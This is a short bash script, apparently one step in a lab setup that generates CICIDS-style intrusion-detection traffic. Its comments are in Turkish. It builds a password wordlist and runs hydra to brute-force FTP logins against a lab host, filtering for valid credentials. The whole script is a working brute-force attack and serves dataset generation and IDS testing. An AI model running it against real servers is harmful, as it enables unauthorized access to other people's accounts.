#!/usr/bin/env bash
# 06 FTP-Patator — hydra ile FTP kaba kuvvet (CICIDS: FTP-Patator)
set -uo pipefail
VIC="${1:-10.10.10.30}"; USER="${2:-svc}"; PASS="${3:-CHANGE_ME_weak_lab_password}"
WL=/tmp/ids_ftp_wl.txt
{ printf '%s\n' password 123456 admin ftp root test user anonymous "$PASS"
  for i in $(seq 1 200); do echo "ftp${i}pass"; done; } | awk '!seen[$0]++' > "$WL"
echo "[ftp-patator] hydra -l $USER ftp://$VIC ($(wc -l < "$WL") parola)"
hydra -l "$USER" -P "$WL" -t 8 -I ftp://"$VIC" 2>&1 | grep -iE "login:|valid|error|done" | head || true
echo "[ftp-patator] done"
